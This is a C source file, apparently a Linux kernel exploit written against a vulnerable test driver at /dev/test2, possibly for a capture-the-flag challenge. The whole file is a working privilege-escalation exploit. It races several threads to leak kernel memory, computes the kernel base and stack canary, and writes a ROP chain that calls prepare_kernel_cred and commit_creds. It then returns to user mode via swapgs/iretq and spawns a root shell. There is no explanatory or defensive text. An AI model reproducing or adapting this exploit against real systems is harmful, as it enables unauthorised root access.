#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <fcntl.h>
#include <string.h>
#include <stropts.h>
#include <pthread.h>
#include <signal.h>
size_t user_cs,user_rflags,user_rsp,user_ss;
uint64_t addr[0x800]={0};
uint64_t rop[0x800]={0};

struct status{
	uint64_t rip;
	uint64_t cs;
	uint64_t rflags;
	uint64_t rsp;
	uint64_t ss;
};
int finish =0;
int finish1=0;
struct status new_status;
size_t user_status=&new_status;

void get_shell()
{
	printf("[*] root !\n");
	system("/bin/sh");
}
void* rrip=get_shell;

void save_status()
{
	__asm(
		"mov user_cs,cs;"
		"mov user_ss,ss;"
		"mov user_rsp,rsp;"
		"pushf;"
		"pop user_rflags;"
		);
	// new_status.cs=user_cs;
	// new_status.rflags=user_rflags;
	// new_status.rsp=user_rsp;
	// new_status.ss=user_ss;
	// new_status.rsp-=0x2000;
	// new_status.rip=&get_shell;
}

uint64_t (*commit_creds)(uint64_t cred) = (void *)0xb91e0;
uint64_t (*prepare_kernel_cred)(uint64_t cred) = (void *)0x0b9550;
void root()
{
	commit_creds(prepare_kernel_cred(0));
	__asm(
		//"mov rsp,user_status;"
		"push user_ss;"
		"push user_rsp;"
		"push user_rflags;"
		"push user_cs;"
		"push rrip;"
		"swapgs;"
		"iretq"
		);
}

uint64_t u64(char * s)
{
	uint64_t result = 0;
	for (int i = 7 ; i >=0 ;i--)
	{
		result = (result << 8) | (0x00000000000000ff & s[i]);
	}
	return result;
}

void change_used(int fd)
{
	finish=2;
	write(fd,addr,0xff);
	printf("1111\n");
}

void change_used1(int fd)
{
	while(1)
	{
		if(finish==2&&finish1==2)
		{
			printf("hack!\n");
			write(fd,addr,0x200);
			write(fd,addr,0x200);
			write(fd,addr,0x200);
			write(fd,addr,0x200);
			write(fd,addr,0x200);
			write(fd,addr,0x200);
			break;
		}
	}
}
void change_used2(int fd)
{
	while(1)
	{
		if(finish==2&&finish1==2)
		{
			sleep(0.3);
			printf("hack!\n");
			write(fd,addr,0x200);
			write(fd,addr,0x200);
			write(fd,addr,0x200);
			write(fd,addr,0x200);
			write(fd,addr,0x200);
			write(fd,addr,0x200);
			break;
		}
	}
}

void buggg()
{
	printf("[*] root !\n");
	system("/bin/sh");
	exit(0);
}

// void leak(int fd)
// {
// 	printf("leak\n");
// 	read(fd,rop,0x300);
// 	while(1)
// 	{
// 		sleep(5);
// 		if(finish==1)
// 		{
// 			printf("attack\n");
// 			read(fd,rop,0x300);
// 			return;
// 		}
// 	}
// }

void change_buf(int fd)
{
	finish=2;
	write(fd,&rop[0x20],0xff);
	printf("1111\n");
}

int main()
{
	signal(SIGSEGV,buggg);
	int status;
	save_status();
	int fd1=open("/dev/test2",O_RDWR);
	size_t tmp ;
	write(fd1,addr,1);
	sleep(2);
	printf("test 1!\n");
	pthread_t t1,t2,t3,t4,t5;
	pthread_create(&t1, NULL, change_used,fd1);
	pthread_create(&t2, NULL, change_used1,fd1);
	finish1=2;
	read(fd1,rop,0x300);
	printf("2222\n");
	pthread_join(t1,(void *) &status);
	sleep(4);
	int i;
	for(i = 0;i<0x40;i++){
		tmp = *(size_t *)(&rop[i]);
		printf("[%2d] %p\n",i,tmp);
	}
	size_t kernel_base=*(size_t *)(&rop[47])-0x426939;
	commit_creds+=kernel_base;
	prepare_kernel_cred+=kernel_base;
	size_t canary=*(size_t *)(&rop[32]);
	size_t pop_rdi_ret=0x835c0+kernel_base;
	printf("kernel_base : %p\n",kernel_base);
	printf("canary : %p\n",canary);
	size_t mov_cr4_rdi_pop_rbp_ret=0x209a0+kernel_base;
	size_t mov_rdi_rax=0x11c6ec3+kernel_base;
	i=36;
	size_t swapgs_pop_rpb=0x6c984+kernel_base;
	size_t iretq_ret=0xe08960+kernel_base;
	size_t set_momory_x=0x79620+kernel_base;
	size_t pop_rsi_ret=kernel_base+0xa247e;
	*(size_t *)(&rop[i++])=pop_rdi_ret;
	// *(size_t *)(&rop[i++])=0x6f0;
	// *(size_t *)(&rop[i++])=mov_cr4_rdi_pop_rbp_ret;
	// *(size_t *)(&rop[i++])=0;
	// *(size_t *)(&rop[i++])=&root;
	*(size_t *)(&rop[i++])=mov_rdi_rax&0xfffffffffffff000;
	*(size_t *)(&rop[i++])=pop_rsi_ret;
	*(size_t *)(&rop[i++])=1;
	*(size_t *)(&rop[i++])=set_momory_x;
	*(size_t *)(&rop[i++])=pop_rdi_ret;
	*(size_t *)(&rop[i++])=0;
	*(size_t *)(&rop[i++])=prepare_kernel_cred;
	*(size_t *)(&rop[i++])=mov_rdi_rax;
	*(size_t *)(&rop[i++])=commit_creds;
	*(size_t *)(&rop[i++])=swapgs_pop_rpb;
	*(size_t *)(&rop[i++])=0;
	*(size_t *)(&rop[i++])=iretq_ret;
	*(size_t *)(&rop[i++])=get_shell;
	*(size_t *)(&rop[i++])=user_cs;
	*(size_t *)(&rop[i++])=user_rflags;
	*(size_t *)(&rop[i++])=user_rsp;
	*(size_t *)(&rop[i++])=user_ss;
	finish=0;
	write(fd1,addr,1);
	sleep(2);
	pthread_create(&t4, NULL, change_buf,fd1);
	pthread_create(&t2, NULL, change_used2,fd1);
	sleep(3);
	read(fd1,rop,0x300);
	return 0;
}